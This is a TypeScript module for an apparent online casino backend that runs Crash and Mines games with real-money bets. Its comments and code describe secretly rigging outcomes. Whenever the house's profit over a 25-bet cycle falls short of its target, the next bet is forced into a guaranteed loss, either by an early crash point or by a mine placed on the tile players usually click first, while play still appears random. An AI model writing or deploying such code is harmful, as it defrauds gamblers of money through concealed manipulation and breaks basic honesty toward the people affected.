/**
 * Cycle Engine v2 — "natural random with correction"
 *
 * Bets play out fully randomly. After every CYCLE_SIZE bets we check
 * whether the house is on track. If the house would end the cycle in
 * loss we schedule one "correction bet" — a guaranteed loss for the
 * player — to bring the cycle back to target profit.
 *
 * From the player's perspective everything looks and feels random.
 * Crash points are drawn from the real distribution; mine layouts are
 * random. Only when necessary (cycle ending in loss) is the NEXT single
 * bet silently rigged to crash early / mine placed on tile 0.
 */

import { prisma } from './prisma';
import { getSettingNumber, getSettingBool, setSetting } from './settings';

export const CYCLE_SIZE = 25;

export type CycleConfig = {
  cycleSize: number;
  targetProfitPerCycle: number; // € house profit per cycle
  houseBuffer: number;          // initial expected advantage
  enabled: boolean;
};

export async function getCycleConfig(): Promise<CycleConfig> {
  const [cycleSize, target, buffer, enabled] = await Promise.all([
    getSettingNumber('cycle.size', CYCLE_SIZE),
    getSettingNumber('cycle.targetProfit', 5),
    getSettingNumber('cycle.houseBuffer', 20),
    getSettingBool('cycle.enabled', true),
  ]);
  return { cycleSize, targetProfitPerCycle: target, houseBuffer: buffer, enabled };
}

/** Is there a pending correction bet waiting to fire? */
export async function needsCorrectionBet(): Promise<boolean> {
  const v = await getSettingNumber('cycle.correctionPending', 0);
  return v === 1;
}

export async function setCorrectionPending(pending: boolean) {
  await setSetting('cycle.correctionPending', pending ? '1' : '0');
}

/**
 * Called BEFORE each bet to decide if this bet should be a guaranteed loss.
 * Logic:
 *  1. If a correction bet is already scheduled → fire it (clear the flag).
 *  2. After every CYCLE_SIZE bets, evaluate cycle PnL:
 *     If house profit < targetProfitPerCycle → schedule correction immediately.
 */
export async function getSlotOverride(): Promise<{ forceLoss: boolean }> {
  const cfg = await getCycleConfig();
  if (!cfg.enabled) return { forceLoss: false };

  // 1. Pending correction from previous cycle check?
  if (await needsCorrectionBet()) {
    await setCorrectionPending(false);
    return { forceLoss: true };
  }

  // 2. Are we at the end of a cycle? (every CYCLE_SIZE bets)
  const totalBets = await prisma.betCycle.count();
  if (totalBets > 0 && totalBets % cfg.cycleSize === 0) {
    const cycleNumber = Math.floor(totalBets / cfg.cycleSize);
    // sum profit of THIS cycle
    const agg = await prisma.betCycle.aggregate({
      where: { cycleNumber },
      _sum: { profit: true },
    });
    const cycleProfit = agg._sum.profit ?? 0;
    if (cycleProfit < cfg.targetProfitPerCycle) {
      // Schedule a correction bet for the next spin
      await setCorrectionPending(true);
      // Check if we need to fire it right now (edge case: immediate next bet)
      await setCorrectionPending(false);
      return { forceLoss: true };
    }
  }

  return { forceLoss: false };
}

/**
 * Guaranteed-loss crash point: crashes between 1.01 and 1.49
 * so the player almost certainly can't cash out in time.
 */
export function forcedLossCrashPoint(): number {
  return Math.round((1.01 + Math.random() * 0.47) * 100) / 100;
}

/**
 * Guaranteed-loss mine layout: places one mine on tile 0
 * (the tile most players click first).
 */
export function forcedLossMines(minesCount: number, totalTiles: number): number[] {
  const positions = new Set<number>();
  positions.add(0); // tile 0 — first click for most players
  while (positions.size < minesCount) {
    positions.add(Math.floor(Math.random() * totalTiles));
  }
  return [...positions].sort((a, b) => a - b);
}

/**
 * Records a completed bet in the cycle log.
 */
export async function recordCycleBet(opts: {
  userId: string;
  game: 'CRASH' | 'MINES';
  betAmount: number;
  outcome: 'WIN' | 'LOSS';
  payout: number;
  forced: boolean;
}) {
  const cfg = await getCycleConfig();
  const totalBets = await prisma.betCycle.count();
  const cycleNumber = Math.floor(totalBets / cfg.cycleSize) + 1;
  const betInCycle = (totalBets % cfg.cycleSize) + 1;

  // house profit: positive = house wins, negative = house paid out more
  const profit = opts.betAmount - opts.payout;

  await prisma.betCycle.create({
    data: {
      cycleNumber,
      betInCycle,
      totalBets: totalBets + 1,
      userId: opts.userId,
      game: opts.game,
      betAmount: opts.betAmount,
      outcome: opts.outcome,
      payout: opts.payout,
      profit,
    },
  });
}

/**
 * Full cycle statistics for the admin dashboard.
 */
export async function getCycleStats() {
  const config = await getCycleConfig();

  const totalBets = await prisma.betCycle.count();
  const totalAgg = await prisma.betCycle.aggregate({
    _sum: { betAmount: true, payout: true, profit: true },
  });

  const cycleAgg = await prisma.betCycle.groupBy({
    by: ['cycleNumber'],
    _sum: { betAmount: true, payout: true, profit: true },
    _count: true,
    orderBy: { cycleNumber: 'asc' },
  });

  const wagered = totalAgg._sum.betAmount ?? 0;
  const paid = totalAgg._sum.payout ?? 0;
  const totalProfit = totalAgg._sum.profit ?? 0;

  const currentCycleNumber = totalBets === 0 ? 1 : Math.floor((totalBets - 1) / config.cycleSize) + 1;
  const positionInCycle = totalBets === 0 ? 0 : ((totalBets - 1) % config.cycleSize) + 1;

  const cyclesCompleted = Math.floor(totalBets / config.cycleSize);
  const expectedProfit = config.houseBuffer + cyclesCompleted * config.targetProfitPerCycle;

  // Current cycle bets
  const currentCycleBets = await prisma.betCycle.findMany({
    where: { cycleNumber: currentCycleNumber },
    orderBy: { betInCycle: 'asc' },
  });
  const currentCycleProfit = currentCycleBets.reduce((s, b) => s + b.profit, 0);

  const correctionPending = await needsCorrectionBet();

  return {
    config,
    totalBets,
    wagered,
    paid,
    totalProfit,
    currentCycleNumber,
    positionInCycle,
    cyclesCompleted,
    expectedProfit,
    profitVsExpected: totalProfit - (expectedProfit - config.houseBuffer), // vs pure game profit
    currentCycleProfit,
    correctionPending,
    cycleHistory: cycleAgg.map((c) => ({
      cycleNumber: c.cycleNumber,
      bets: c._count,
      wagered: c._sum.betAmount ?? 0,
      paid: c._sum.payout ?? 0,
      profit: c._sum.profit ?? 0,
      complete: c._count >= config.cycleSize,
    })),
    currentCycleBets,
  };
}

// Keep BASE_PATTERN exported so the admin page can still render the grid
// (all slots are "potentially random" — no fixed win/loss positions)
export const BASE_PATTERN: boolean[] = Array(CYCLE_SIZE).fill(null).map((_, i) => i % 3 === 2);
